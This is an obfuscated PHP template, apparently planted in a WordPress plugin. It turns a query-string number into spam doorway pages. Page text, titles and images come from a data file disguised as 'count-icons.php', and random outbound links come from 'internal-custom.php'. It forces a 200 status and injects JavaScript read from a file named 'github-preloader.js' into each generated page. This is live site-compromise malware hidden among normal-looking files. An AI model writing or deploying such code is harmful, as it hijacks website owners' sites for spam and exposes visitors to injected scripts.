<?php
$rUddjPt = intval(get_query_var('yxgglz'));

if ($rUddjPt < 1 || $rUddjPt > 4497) return;
$bOEROBxH = file(plugin_dir_path(__FILE__).'count-icons.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$p7bJ6df = explode(';', $bOEROBxH[$rUddjPt]);
if (count($p7bJ6df) < 2) return;
$iWMRO2QH = $p7bJ6df[0];
$bShqegz  = $p7bJ6df[1];
$gpgVPgdrL = $p7bJ6df[2];
$imEaYkk  = $p7bJ6df[3];
$lxlTdIf = $p7bJ6df[4];
set_query_var('ctvboynad', $iWMRO2QH);

$qsiTAoX = '';
$qPKw5GO3vM = plugin_dir_path(__FILE__).'internal-custom.php';
if (is_file($qPKw5GO3vM)) {
	$b2paqg = file($qPKw5GO3vM, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($b2paqg);
	shuffle($b2paqg);
	$seQxsmROiF = mt_rand(2, 5);
	if (count($b2paqg) > $seQxsmROiF) {
		for ($og6spR5Nd = 0; $og6spR5Nd < $seQxsmROiF; $og6spR5Nd++) {
			$ecDO8CO = array_shift($b2paqg);
			$qsiTAoX .= '<p><a href="'.$ecDO8CO.'">'.$ecDO8CO.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $iWMRO2QH; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $bShqegz . "</p>\n";
				if (strlen($imEaYkk) > 0) echo "<p>" . $imEaYkk . "</p>\n";
				if (strlen($gpgVPgdrL) > 0) echo "<p>" . $gpgVPgdrL . "</p>\n";
				if (strlen($lxlTdIf) > 0) echo '<p><a href="#"><img src="'.$lxlTdIf.'"></a>' . "</p>\n";
				echo $qsiTAoX;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$i0WGpWZ = plugin_dir_path(__FILE__) . 'github-preloader.js';
if (is_file($i0WGpWZ)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($i0WGpWZ);
	echo '</script>';
}
get_footer();
?>
